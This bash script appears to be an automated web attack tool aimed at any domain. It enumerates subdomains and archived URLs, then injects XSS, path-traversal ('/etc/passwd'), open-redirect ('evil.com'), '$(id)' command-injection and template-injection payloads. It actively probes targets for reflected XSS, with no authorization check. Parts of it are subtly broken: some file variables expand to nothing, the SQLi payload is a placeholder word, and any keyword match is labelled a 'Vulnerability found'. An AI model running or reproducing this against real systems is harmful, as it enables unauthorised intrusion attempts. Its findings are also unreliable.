#!/bin/bash

# ASCII Art for Wolf Face
echo "
  / \__
 (    @\___
 /         O
/   (_____/
/_____/   U
"

# Function to handle errors and retry
fetch_with_retries() {
    local url=$1
    local output_file=$2
    local retries=5
    local delay=5

    for ((i=0; i<$retries; i++)); do
        curl -s "$url" -o "$output_file"
        if [[ $? -eq 0 && -s "$output_file" ]]; then
            echo "[*] Successfully fetched $url"
            return 0
        else
            echo "[!] Error fetching $url. Retrying in $delay seconds..."
            sleep $delay
        fi
    done
    echo "[!] Failed to fetch $url after $retries attempts."
    return 1
}

# Define target
TARGET=$1

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

# Create a directory for the target
mkdir -p $TARGET
cd $TARGET

# Subdomain enumeration
echo "[*] Enumerating subdomains for $TARGET..."
subfinder -d $TARGET -silent -o subfinder_subdomains.txt &
assetfinder --subs-only $TARGET > assetfinder_subdomains.txt &
amass enum -d $TARGET -o amass_subdomains.txt &
wait

# Merging subdomains into a single file and removing duplicates
echo "[*] Merging subdomains and removing duplicates..."
cat subfinder_subdomains.txt assetfinder_subdomains.txt amass_subdomains.txt | sort -u > all_subdomains.txt

# Resolving live subdomains using httpx
echo "[*] Resolving live subdomains with httpx..."
httpx -silent -l all_subdomains.txt -title -status-code -content-length -web-server -o live_subdomains.txt

# Collecting endpoints with waybackurls and gau
echo "[*] Collecting endpoints with waybackurls and gau..."
fetch_with_retries "https://web.archive.org/cdx/search/cdx?url=$TARGET/*&output=txt&collapse=urlkey&fl=original&page=/" "waybackurls_endpoints.txt"
cat live_subdomains.txt | gau >> waybackurls_endpoints.txt &
wait
sort -u waybackurls_endpoints.txt -o all_endpoints.txt

# Running paramspider for parameters enumeration
echo "[*] Running paramspider for parameters enumeration..."
paramspider -l $live_subdomains.txt -o param.txt

# Checking vulnerabilities using gf patterns
echo "[*] Checking for vulnerabilities..."

# GF patterns
cat all_endpoints.txt | gf xss > xss.txt &
cat all_endpoints.txt | gf sqli > sqli.txt &
cat all_endpoints.txt | gf lfi > lfi.txt &
cat all_endpoints.txt | gf redirect > redirect.txt &
cat all_endpoints.txt | gf rce > rce.txt &
cat all_endpoints.txt | gf ssti > ssti.txt &
wait

# Replace payloads using qsreplace
echo "[*] Replacing payloads with qsreplace..."

# Replace XSS payloads
qsreplace '"/><script>confirm(1)</script>' < xss.txt > xss_payloads.txt

# Replace SQLi payloads
qsreplace 'payloads' < sqli.txt > sqli_payloads.txt

# Replace LFI payloads
qsreplace '../../../../../etc/passwd' < lfi.txt > lfi_payloads.txt

# Replace Redirect payloads
qsreplace 'http://evil.com' < redirect.txt > redirect_payloads.txt

# Replace RCE payloads
qsreplace '$(id)' < rce.txt > rce_payloads.txt

# Replace SSTI payloads
qsreplace '{{7*7}}' < ssti.txt > ssti_payloads.txt

# XSS Check with paramspider
echo "[*] Checking for XSS vulnerabilities using paramspider results..."
paramspider -l $all_endpoints.txt | qsreplace '"/><script>confirm(1)</script>' > xss.txt
while read -r host; do
    if curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)"; then
        echo -e "$host \033[0;31mVulnerable\033[0m"
    else
        echo -e "$host \033[0;32mNot Vulnerable\033[0m"
    fi
done < xss.txt

# Keyword search
echo "[*] Searching for keywords in all_endpoints.txt..."
KEYWORDS=("admin" "config" "key" "password" "token" "login" "secure" "api" "db" "backup" "private" "public" "internal" "test" "staging" "root" "access" "user" "credentials" "secret" "verify" "auth" "cmd" "execute" "upload" "download" "file" "debug" "test" "error" "database" "php" "asp" "jsp" "cgi" "shell" "bin" "home" "account" "panel" "portal" "control" "manage" "admin" "system" "webadmin" "administrator" "host" "site" "server" "netadmin" "domain" "dns" "config" "secure" "security" "backup" "data" "account" "file" "upload" "download" "db" "access" "edit" "modify" "remove" "delete" "update" "insert" "select" "drop" "create" "alter" "grant" "revoke" "admin" "administrator" "manager" "root" "superuser" "system" "owner" "operator" "tech" "developer" "maintainer" "tester" "user" "guest" "anonymous" "employee" "staff" "hr" "finance" "it" "support" "helpdesk" "network" "api" "auth" "token" "jwt" "oauth" "sso" "openid" "saml" "cas" "2fa" "mfa" "otp" "ldap" "kerberos" "key" "secret" "private" "public" "ssh" "rsa" "dsa" "ecdsa" "pki" "certificate" "ssl" "tls" "https" "http" "admin" "administrator" "admin")

for keyword in "${KEYWORDS[@]}"; do
    grep -i "$keyword" all_endpoints.txt > "${keyword}_endpoints.txt"
    if [ -s "${keyword}_endpoints.txt" ]; then
        echo -e "\033[0;31mVulnerability found: $keyword\033[0m"
    else
        echo -e "\033[0;32mNo issues found for: $keyword\033[0m"
    fi
done

# Output summary
echo "[*] Summary:"
echo "Total subdomains found by subfinder: $(wc -l < subfinder_subdomains.txt)"
echo "Total subdomains found by assetfinder: $(wc -l < assetfinder_subdomains.txt)"
echo "Total subdomains found by amass: $(wc -l < amass_subdomains.txt)"
echo "Total unique subdomains: $(wc -l < all_subdomains.txt)"
echo "Total live subdomains: $(wc -l < live_subdomains.txt)"
echo "Total endpoints collected: $(wc -l < all_endpoints.txt)"
echo "Paramspider parameters: $(wc -l < param.txt)"
echo "GF XSS results: $(wc -l < xss.txt)"
echo "GF SQLi results: $(wc -l < sqli.txt)"
echo "GF LFI results: $(wc -l < lfi.txt)"
echo "GF Redirect results: $(wc -l < redirect.txt)"
echo "GF RCE results: $(wc -l < rce.txt)"
echo "GF SSTI results: $(wc -l < ssti.txt)"
echo "XSS check results: $(wc -l < xss_payloads.txt)"
echo "SQLi check results: $(wc -l < sqli_payloads.txt)"
echo "LFI check results: $(wc -l < lfi_payloads.txt)"
echo "Redirect check results: $(wc -l < redirect_payloads.txt)"
echo "RCE check results: $(wc -l < rce_payloads.txt)"
echo "SSTI check results: $(wc -l < ssti_payloads.txt)"

echo "[*] Done! The results are saved in $(pwd)"
